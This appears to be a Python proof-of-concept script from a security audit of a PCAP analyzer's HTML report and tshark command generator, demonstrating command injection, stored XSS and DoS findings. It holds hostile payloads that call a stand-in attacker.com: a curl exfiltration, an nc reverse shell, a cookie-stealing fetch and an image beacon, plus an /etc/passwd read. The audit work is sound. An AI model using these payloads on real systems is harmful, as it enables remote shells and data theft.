"""
Proof-of-Concept Security Exploits

Demonstrates actual exploitability of discovered vulnerabilities.
"""

import os
import subprocess
from src.exporters.html_report import HTMLReportGenerator


class POCCommandInjection:
    """Proof-of-concept command injection exploits."""

    @staticmethod
    def poc_1_semicolon_injection():
        """POC #1: Command injection via semicolon in flow_key."""
        print("\n" + "="*80)
        print("POC #1: COMMAND INJECTION - Semicolon Chain")
        print("="*80)
        print("\nSeverity: CRITICAL")
        print("CVSS Score: 9.8 (Critical)")
        print("\nDescription:")
        print("  An attacker can inject arbitrary shell commands by including semicolons")
        print("  in flow_key data (IP addresses). The malicious input is directly embedded")
        print("  into tshark commands without sanitization.")
        print("\nAttack Vector:")
        print("  1. Attacker sends packets with crafted IP addresses")
        print("  2. PCAP analyzer parses these IPs into flow_keys")
        print("  3. flow_keys are embedded in tshark commands without escaping")
        print("  4. When user copies and runs the command, arbitrary code executes")
        print("\nExploit:")

        generator = HTMLReportGenerator()
        malicious_flow_key = "10.0.0.1; curl http://attacker.com/steal?data=$(whoami):80 → 10.0.0.2:443"
        flow_parts = malicious_flow_key.replace(" → ", ":").split(":")

        if len(flow_parts) >= 4:
            src_ip = flow_parts[0]
            ws_commands = generator._generate_wireshark_commands(
                src_ip=src_ip,
                src_port="80",
                dst_ip="10.0.0.2",
                dst_port="443",
                flow_type="general"
            )

            tshark_cmd = ws_commands.get("tshark_extract", "")

            print(f"\n  Malicious flow_key:")
            print(f"    {malicious_flow_key}")
            print(f"\n  Generated tshark command:")
            print(f"    {tshark_cmd}")
            print(f"\n  Impact:")
            print(f"    - Exfiltrates username to attacker.com")
            print(f"    - Can execute any command with user's privileges")
            print(f"    - No authentication or validation required")

            return tshark_cmd

    @staticmethod
    def poc_2_backtick_injection():
        """POC #2: Command substitution via backticks."""
        print("\n" + "="*80)
        print("POC #2: COMMAND INJECTION - Backtick Substitution")
        print("="*80)
        print("\nSeverity: CRITICAL")
        print("CVSS Score: 9.8 (Critical)")
        print("\nDescription:")
        print("  Backticks enable command substitution in shell. Attacker can execute")
        print("  commands and embed their output into the tshark filter.")
        print("\nExploit:")

        generator = HTMLReportGenerator()
        malicious_flow_key = "10.0.0.1 `cat /etc/passwd > /tmp/pwned`:80 → 10.0.0.2:443"
        flow_parts = malicious_flow_key.replace(" → ", ":").split(":")

        if len(flow_parts) >= 4:
            src_ip = flow_parts[0]
            ws_commands = generator._generate_wireshark_commands(
                src_ip=src_ip,
                src_port="80",
                dst_ip="10.0.0.2",
                dst_port="443",
                flow_type="general"
            )

            tshark_cmd = ws_commands.get("tshark_extract", "")

            print(f"\n  Malicious flow_key:")
            print(f"    {malicious_flow_key}")
            print(f"\n  Generated tshark command:")
            print(f"    {tshark_cmd}")
            print(f"\n  Impact:")
            print(f"    - Reads /etc/passwd and writes to /tmp/pwned")
            print(f"    - Can execute any command and use its output")
            print(f"    - Enables multi-stage attacks")

            return tshark_cmd

    @staticmethod
    def poc_3_pipe_injection():
        """POC #3: Command injection via pipe operator."""
        print("\n" + "="*80)
        print("POC #3: COMMAND INJECTION - Pipe Operator")
        print("="*80)
        print("\nSeverity: CRITICAL")
        print("CVSS Score: 9.8 (Critical)")
        print("\nDescription:")
        print("  Pipe operator allows chaining commands and redirecting output to")
        print("  attacker-controlled processes.")
        print("\nExploit:")

        generator = HTMLReportGenerator()
        malicious_flow_key = "10.0.0.1 | nc attacker.com 4444 -e /bin/bash:80 → 10.0.0.2:443"
        flow_parts = malicious_flow_key.replace(" → ", ":").split(":")

        if len(flow_parts) >= 4:
            src_ip = flow_parts[0]
            ws_commands = generator._generate_wireshark_commands(
                src_ip=src_ip,
                src_port="80",
                dst_ip="10.0.0.2",
                dst_port="443",
                flow_type="general"
            )

            tshark_cmd = ws_commands.get("tshark_extract", "")

            print(f"\n  Malicious flow_key:")
            print(f"    {malicious_flow_key}")
            print(f"\n  Generated tshark command:")
            print(f"    {tshark_cmd}")
            print(f"\n  Impact:")
            print(f"    - Opens reverse shell to attacker.com:4444")
            print(f"    - Full remote code execution")
            print(f"    - Persistent backdoor access")

            return tshark_cmd


class POCXSSExploits:
    """Proof-of-concept XSS exploits."""

    @staticmethod
    def poc_4_script_tag_injection():
        """POC #4: XSS via <script> tag in flow_key."""
        print("\n" + "="*80)
        print("POC #4: STORED XSS - Script Tag Injection")
        print("="*80)
        print("\nSeverity: HIGH")
        print("CVSS Score: 7.4 (High)")
        print("\nDescription:")
        print("  flow_key data is embedded directly into HTML without escaping.")
        print("  Attacker can inject <script> tags that execute in victim's browser.")
        print("\nAttack Vector:")
        print("  1. Attacker sends packets with crafted source/destination IPs")
        print("  2. These IPs are parsed into flow_keys")
        print("  3. flow_keys are embedded in HTML report without sanitization")
        print("  4. When user opens HTML report, malicious JavaScript executes")
        print("\nExploit:")

        xss_flow_key = "<script>fetch('http://attacker.com/steal?cookie='+document.cookie)</script>:80 → 10.0.0.2:443"
        html = f'<td style="padding: 10px; font-family: monospace; font-size: 0.9em;">{xss_flow_key}</td>'

        print(f"\n  Malicious flow_key:")
        print(f"    {xss_flow_key}")
        print(f"\n  Generated HTML:")
        print(f"    {html}")
        print(f"\n  Impact:")
        print(f"    - Steals session cookies and sends to attacker.com")
        print(f"    - Can access localStorage, sessionStorage")
        print(f"    - Full DOM access and manipulation")
        print(f"    - Affects anyone who opens the HTML report")

        return html

    @staticmethod
    def poc_5_event_handler_injection():
        """POC #5: XSS via event handlers."""
        print("\n" + "="*80)
        print("POC #5: STORED XSS - Event Handler Injection")
        print("="*80)
        print("\nSeverity: HIGH")
        print("CVSS Score: 7.4 (High)")
        print("\nDescription:")
        print("  HTML event handlers (onerror, onclick, etc.) enable XSS without")
        print("  using <script> tags. Bypasses some basic XSS filters.")
        print("\nExploit:")

        xss_flow_key = "<img src=x onerror='new Image().src=\"http://attacker.com/log?\"+document.domain'>:80 → 10.0.0.2:443"
        html = f'<td style="padding: 10px; font-family: monospace; font-size: 0.9em;">{xss_flow_key}</td>'

        print(f"\n  Malicious flow_key:")
        print(f"    {xss_flow_key}")
        print(f"\n  Generated HTML:")
        print(f"    {html}")
        print(f"\n  Impact:")
        print(f"    - Exfiltrates domain information to attacker.com")
        print(f"    - Triggers on page load (no user interaction needed)")
        print(f"    - Can perform any JavaScript action")

        return html

    @staticmethod
    def poc_6_tshark_command_xss():
        """POC #6: XSS in tshark command display."""
        print("\n" + "="*80)
        print("POC #6: STORED XSS - Tshark Command Display")
        print("="*80)
        print("\nSeverity: HIGH")
        print("CVSS Score: 7.4 (High)")
        print("\nDescription:")
        print("  Tshark commands containing malicious filters are displayed in HTML")
        print("  without escaping. Allows XSS in the command preview section.")
        print("\nExploit:")

        tshark_filter = "ip.src == <img src=x onerror=alert(document.domain)>"
        html = f'<pre style="margin: 0; overflow-x: auto;">tshark -r input.pcap -Y \'{tshark_filter}\'</pre>'

        print(f"\n  Malicious tshark filter:")
        print(f"    {tshark_filter}")
        print(f"\n  Generated HTML:")
        print(f"    {html}")
        print(f"\n  Impact:")
        print(f"    - Executes JavaScript when viewing command box")
        print(f"    - Can be combined with other attacks")
        print(f"    - Affects command preview functionality")

        return html


class POCDoSExploits:
    """Proof-of-concept DoS exploits."""

    @staticmethod
    def poc_7_resource_exhaustion():
        """POC #7: Resource exhaustion via malformed flow_keys."""
        print("\n" + "="*80)
        print("POC #7: DENIAL OF SERVICE - Resource Exhaustion")
        print("="*80)
        print("\nSeverity: MEDIUM")
        print("CVSS Score: 5.3 (Medium)")
        print("\nDescription:")
        print("  Extremely long or complex flow_keys can cause excessive memory usage")
        print("  or slow HTML generation, leading to DoS.")
        print("\nExploit:")

        generator = HTMLReportGenerator()

        # Generate extremely long flow_key
        long_ip = "A" * 10000
        malicious_flow_key = f"{long_ip}:80 → 10.0.0.2:443"

        print(f"\n  Malicious flow_key length: {len(malicious_flow_key)} characters")
        print(f"\n  Impact:")
        print(f"    - Excessive memory allocation")
        print(f"    - HTML report generation slowdown")
        print(f"    - Potential browser crash when opening report")

        return malicious_flow_key


def run_all_pocs():
    """Execute all proof-of-concept exploits."""
    print("\n" + "="*80)
    print("SECURITY AUDIT - PROOF-OF-CONCEPT EXPLOITS")
    print("Enhanced tshark Command Generation Implementation")
    print("="*80)

    print("\n" + "+"*80)
    print("| CRITICAL VULNERABILITIES - IMMEDIATE REMEDIATION REQUIRED |")
    print("+"*80)

    # Command Injection POCs
    POCCommandInjection.poc_1_semicolon_injection()
    POCCommandInjection.poc_2_backtick_injection()
    POCCommandInjection.poc_3_pipe_injection()

    # XSS POCs
    POCXSSExploits.poc_4_script_tag_injection()
    POCXSSExploits.poc_5_event_handler_injection()
    POCXSSExploits.poc_6_tshark_command_xss()

    # DoS POCs
    POCDoSExploits.poc_7_resource_exhaustion()

    print("\n" + "="*80)
    print("SUMMARY OF FINDINGS")
    print("="*80)
    print("\nCRITICAL (3):")
    print("  1. Command Injection via semicolon (POC #1)")
    print("  2. Command Injection via backticks (POC #2)")
    print("  3. Command Injection via pipe operator (POC #3)")
    print("\nHIGH (3):")
    print("  4. Stored XSS via <script> tags (POC #4)")
    print("  5. Stored XSS via event handlers (POC #5)")
    print("  6. Stored XSS in tshark commands (POC #6)")
    print("\nMEDIUM (1):")
    print("  7. DoS via resource exhaustion (POC #7)")
    print("\nOVERALL RISK: CRITICAL")
    print("\nRECOMMENDATION:")
    print("  DO NOT DEPLOY TO PRODUCTION")
    print("  Immediate remediation required for all CRITICAL and HIGH findings")
    print("="*80 + "\n")


if __name__ == "__main__":
    run_all_pocs()
